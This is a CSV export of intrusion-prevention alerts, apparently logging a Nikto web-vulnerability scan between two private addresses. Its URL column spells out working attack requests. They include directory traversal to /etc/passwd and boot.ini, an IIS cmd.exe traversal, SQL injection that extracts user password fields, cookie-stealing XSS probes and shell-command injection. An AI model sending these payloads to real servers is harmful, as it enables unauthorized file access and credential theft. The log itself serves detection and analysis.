attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
44780,7174,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50862,80,ips,signature,/
12648,7174,1,medium,HTPasswd.Access,HTTP,172.16.1.2,172.16.2.2,50862,80,ips,signature,/5PkUWXOP.htpasswd
44780,7174,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50862,80,ips,signature,
44780,7175,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50864,80,ips,signature,/5PkUWXOP.EXE
44780,7175,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50864,80,ips,signature,
44780,7176,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50866,80,ips,signature,/5PkUWXOP.cmd
44780,7176,58,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50866,80,ips,signature,
44780,7177,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50868,80,ips,signature,/index.php
15229,7177,1,medium,Apache.Expect.Header.XSS,HTTP,172.16.1.2,172.16.2.2,50868,80,ips,signature,/
44780,7177,14,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50868,80,ips,signature,
44780,7178,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50870,80,ips,signature,/nikto-test-TXANp1NR.html
44780,7178,4,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50870,80,ips,signature,
44780,7179,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50872,80,ips,signature,/
44780,7180,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50874,80,ips,signature,/
44780,7180,2,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50874,80,ips,signature,
44780,7181,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50876,80,ips,signature,/
44780,7182,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/TiVoConnect?Command=QueryServer
15463,7182,1,high,PHP.URI.Code.Injection,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,/forumdisplay.php?GLOBALS[]=1&f=2&comma=\\\
44780,7182,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50878,80,ips,signature,
44780,7183,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50880,80,ips,signature,/scripts/samples/search/filetime.idq
44780,7183,29,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50880,80,ips,signature,
44780,7184,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50882,80,ips,signature,/pbserver/pbserver.dll
44780,7184,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50882,80,ips,signature,
44780,7185,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/webcart/orders/import.txt
46767,7185,1,medium,Novell.NetBasic.Scripting.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,/nsn/..%5Cutil/chkvol.bas
44780,7185,92,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,
46767,7185,7,medium,Novell.NetBasic.Scripting.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50884,80,ips,signature,
44780,7186,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50886,80,ips,signature,/domlog.nsf
44780,7186,7,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50886,80,ips,signature,
44780,7187,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50888,80,ips,signature,/
44780,7188,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50890,80,ips,signature,//
44780,7188,23,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50890,80,ips,signature,
27560,7189,1,low,NaviCOPA.Source.Code.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/index.html%20
44780,7189,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/852566C90012664F
43336,7189,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
12015,7189,1,high,MS.IIS.Web.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
30908,7189,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
13106,7189,1,medium,Php.Exe.Disclosure,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/php/php.exe?c:\\winnt\\boot.ini
24975,7189,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini
13011,7189,1,high,Apache.DOS.Batch.Script.Parsing.Command.Execution,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,/ssi/envout.bat?|dir%20..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\
44780,7189,39,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,
43336,7189,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,
13106,7189,1,medium,Php.Exe.Disclosure,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,
24975,7189,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50892,80,ips,signature,
44780,7190,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50894,80,ips,signature,/../../../../winnt/repair/sam._
24975,7191,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\boot.ini
43336,7191,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,///etc/passwd
44780,7191,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,///etc/hosts
24975,7191,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50896,80,ips,signature,
44780,7192,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50898,80,ips,signature,/.cobalt/sysManage/../admin/.htaccess
43336,7192,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50898,80,ips,signature,/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
43336,7192,6,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50898,80,ips,signature,
44780,7193,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\\boot.ini
43336,7193,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
30908,7193,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/index.php?page=../../../../../../../../../../boot.ini
18057,7193,1,medium,Netscape.Search.NS.Query.Pat.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,/search?NS-query-pat=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini
44780,7193,6,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,
43336,7193,25,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,
30908,7193,2,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50900,80,ips,signature,
24975,7194,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,/.../.../.../.../.../.../.../.../.../boot.ini
43336,7194,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,/................../etc/passwd
44780,7194,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,/%3f.jsp
44780,7194,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50902,80,ips,signature,
43336,7195,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50904,80,ips,signature,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
44780,7196,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,/%00
43336,7196,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,/ca/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\/\\\\etc/\\\\passwd
44780,7196,5,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,
43336,7196,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50906,80,ips,signature,
43336,7197,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50908,80,ips,signature,"/site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html"
15621,7198,1,high,HTTP.URI.SQL.Injection,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
44780,7198,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
10574,7198,1,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,/<script>alert('Vulnerable')</script>.shtm
15621,7198,2,high,HTTP.URI.SQL.Injection,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,
44780,7198,78,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,
10574,7198,4,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50910,80,ips,signature,
44780,7199,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
34971,7199,1,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,/phpBB/viewtopic.php?t=17071&highlight=\\\
44780,7199,65,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50912,80,ips,signature,
44780,7200,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50914,80,ips,signature,/index.php?file=Liens&op=\\\
44780,7200,3,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50914,80,ips,signature,
34971,7201,1,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,50916,80,ips,signature,/index.php/\\\
44780,7201,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50916,80,ips,signature,/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>
44780,7201,10,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50916,80,ips,signature,
44780,7202,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50918,80,ips,signature,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
44780,7202,13,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50918,80,ips,signature,
44780,7203,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50920,80,ips,signature,/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\\\
44780,7203,8,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50920,80,ips,signature,
44780,7204,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50922,80,ips,signature,/article.cfm?id=1'<script>alert(document.cookie);</script>
44780,7204,3,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50922,80,ips,signature,
44780,7205,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
10574,7205,1,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/a?<script>alert('Vulnerable')</script>
43336,7205,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,/cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download
